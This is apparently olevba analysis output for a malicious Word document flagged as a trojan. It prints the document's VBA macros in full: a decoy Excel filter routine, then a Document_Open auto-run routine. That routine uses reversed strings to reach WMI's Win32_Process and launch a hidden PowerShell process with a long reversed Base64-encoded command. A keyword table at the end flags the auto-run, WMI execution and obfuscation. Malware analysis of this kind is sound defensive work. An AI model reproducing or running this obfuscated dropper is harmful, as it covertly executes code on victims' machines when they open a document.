olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.SAgent.gen-d5dbceaabf6144b98dcb666b3ad38f19c7ac9cd386781ebc19de5be8f2651ff9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.SAgent.gen-d5dbceaabf6144b98dcb666b3ad38f19c7ac9cd386781ebc19de5be8f2651ff9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Filter_contains()
    Dim FilterRange As Range
    Dim ColumnName As String, fltr As String
    Dim col As Integer
    
    Application.ScreenUpdating = False
    
    On Error Resume Next
    '----------Filters are there in sheet or not?-------------
    If Not (ActiveSheet.AutoFilterMode) And ActiveCell.ListObject Is Nothing Then
         MsgBox "Filter-Range is not applied, please apply filters"
         Exit Sub
    End If
    
    '-------What is to be filtered?--------------
    fltr = InputBox("Filtering value", ActiveSheet.Name & " : Filtering Active Column", ActiveCell.Value)
    If fltr = "" Or fltr = "+" Then: Exit Sub
    
    '-------In which column filter to be applied?--------------
    If Not (ActiveCell.ListObject Is Nothing) Then
        Set FilterRange = ActiveCell.ListObject.HeaderRowRange
    Else
        Set FilterRange = ActiveSheet.AutoFilter.Range
    End If
    
    ColumnName = Intersect(FilterRange.Rows(1), ActiveCell.EntireColumn).Value
    col = Application.Match(ColumnName, FilterRange.Rows(1), 0)

    '------------applying new filter / adding into existing filter?-------
    If Left(fltr, 1) <> "+" Then
         ActiveSheet.ShowAllData 'if data is not filltered then will show error
    Else
          fltr = Right(fltr, Len(fltr) - 1) 'removing + sign
    End If
    
    
    '--------Finally Applying filter--------
    If Not (ActiveCell.ListObject Is Nothing) Then
        ActiveCell.ListObject.Range.AutoFilter _
            Field:=col, _
            Criteria1:="=*" & fltr & "*", Operator:=xlOr, Criteria2:="=" & fltr
    Else
        ActiveSheet.Range(FilterRange.Address).AutoFilter _
            Field:=col, _
            Criteria1:="=*" & fltr & "*", Operator:=xlOr, Criteria2:="=" & fltr
    End If
    
    Application.ScreenUpdating = False
End Sub



Sub Document_Open()
Akela
End Sub

Sub Akela()

On Error GoTo Med
Set Jariaie = GetObject("dksjdkfj")
Med:
Call GetObject(StrReverse("ss" + "ec" + "orP_" + "23niW" + ":2" + "vmi" + "c\t" + "oor:" + "stm" + "gmn" + "iw")). _
Create(StrReverse("AADA0BgbAMGArBAIAQHAzBQaAwEA0BgbAUGAtBQdAcGAyBQQA0CAgAQMAMHAnBQeAQDAgAwcAMHAlBwYA8GAyBAUA0CA0BgcAEGA0BwUAACAgAwOAADA0BgbAMGArBAIAMGA3AQNAEHAwBAIAUGAkBwbAMGAlBAZA0CAgAAbAkGA0BQdAQHAyBQZAMGAgAwOAICAQBQTAUEAUBgOAYHAuBQZAQCAiAAIAgGA0BQYAAFAtAAIA4GAvBQaAQHAhBwYA8GAMBQLAQHAlBwUAAC" + "A7AgIA0GAvBwYA4CAK" + "BwYAgFAvBAbAwFAQBQTAUE" + "AUBgOAYHAuBQZAQCAiAALAICAjBwNAUDAxBAcAwFAQBQTAUEAUBgOAYHAuBQZAQCAiAALAICAtBwbAMGAuAQMAMHAnBQeAQDAcBAUA0EAFBA" + "VAoDA2BgbAUGAkAgIAACAuBwbAkGA0BQYA4GApBAdAMH" + "AlBARA0CAgAAdAEGAkBgLAoEAjBAWA8G" + "AsBwLAUGA0BQaAMHAuAAMAEDAwBgcA8GAjBwLA8CA6AAcAQHA0BAaAwCA0BQYAQGAuAQYAcEAlBAdAgEAvAQZAQHApBwcA4CAwAQMAAHAyBwbAMGAvAwLAoDAwBAdAQHAoBALAQHAhBAZA4CAhBAVAcGAlBAdAkFAvAQZAQHApBwcA4CAwAQMAAHAyBwbAMGAvAwLAoDAwBAdAQHAoBAIAUGAjBgcAUHAvBwUA0CAgAgcAUGAmBwcA4GAhBgcAQFAzBAdAkGACBQLAQHAyBQYAQHATBAIAsDAyBQZAYGAzBgbAEGAyBAVAMHA0BQaAI" + "EAgAQZAwGA1BAZA8GANBQLAQHAyBwbAAHAtBQS e- ne" + "ddi" + "h ely" + "tswodn" + "iw- " + Replace("l" + "l%" + "h" + "sr" + "%w" + "op", "%", "e")), _
Null, Null, Keja)
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

